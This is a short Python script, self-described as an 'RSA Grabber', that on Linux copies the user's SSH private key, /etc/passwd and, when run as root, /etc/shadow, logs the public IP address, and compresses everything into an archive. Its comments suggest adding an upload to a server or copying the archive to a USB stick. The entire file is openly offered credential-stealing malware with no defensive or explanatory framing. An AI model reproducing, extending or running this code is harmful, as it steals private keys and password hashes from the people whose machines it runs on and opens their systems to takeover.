import os
import requests
from sys import platform
import getpass
from pathlib import Path
import time

if platform == "linux":
    print("You are using RSA Grabber tool by Xatt")
    os.system('echo YOu used xatt his RSA Grabber > tool_used.txt')
    username = getpass.getuser()
    rsa_file = Path(f"/home/{username}/.ssh/id_rsa")
    if rsa_file.exists():
        print("RSA Detected.. Stealing RSA")
        os.system('mkdir ~/rsagrabber')
        os.system('cp ~/.ssh/id_rsa ~/rsagrabber')
        os.system('curl ifconfig.me > ~/rsagrabber/ipadd.txt')
        os.system('cp /etc/passwd ~/rsagrabber')
        if getpass.getuser() == "root":
            print("You are root, grabbing shadow")
            os.system('cp /etc/shadow ~/rsagrabber')
        else:
            print("You are not using root. Not sending shadow and passwd over.")
        os.system(f'tar -czvf ~/info.tar.gz ~/rsagrabber')
        print("Done zipping information, getting ready to upload compressed file.")
        # Please add a function to upload the zipped file to your database.
        # Or upload the file to a USB Stick.
        # Recommendations: "http", "request_toolbelt", "scp", "FTP" ect.
        os.system('dolphin ~') # Remove function when not using KDE
        print("Just copy paste info.tar.gz to your USB stick or server.")
    else:
        print("Program failed, or you don't have RSA")

elif platform == "darwin":
    print("You are not supported at the moment")
elif platform == "win32":
    print("You are not supported at the moment")
